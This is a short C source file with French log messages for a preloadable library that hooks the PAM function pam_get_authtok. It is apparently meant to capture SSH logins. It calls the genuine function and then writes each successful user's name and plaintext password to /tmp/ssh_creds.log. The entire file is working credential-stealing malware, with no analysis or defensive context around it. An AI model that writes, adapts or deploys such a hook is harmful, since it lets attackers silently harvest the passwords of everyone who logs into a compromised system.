#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

typedef int (*pam_get_authtok_t)(pam_handle_t *, int, const char **, const char *);
pam_get_authtok_t orig_pam_get_authtok = NULL;

int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char *prompt) {
    if (!orig_pam_get_authtok) {
        orig_pam_get_authtok = dlsym(RTLD_NEXT, "pam_get_authtok");
        if (!orig_pam_get_authtok) {
            fprintf(stderr, "[-] Erreur dlsym : impossible de récupérer pam_get_authtok\n");
            return PAM_AUTH_ERR;
        }
    }

    int ret = orig_pam_get_authtok(pamh, item, authtok, prompt);

    if (ret == PAM_SUCCESS && authtok && *authtok) {
        FILE *f = fopen("/tmp/ssh_creds.log", "a");
        if (f) {
            fprintf(f, "[+] Username : %s | Mot de passe : %s\n", getenv("USER"), *authtok);
            fclose(f);
        }
    }

    return ret;
}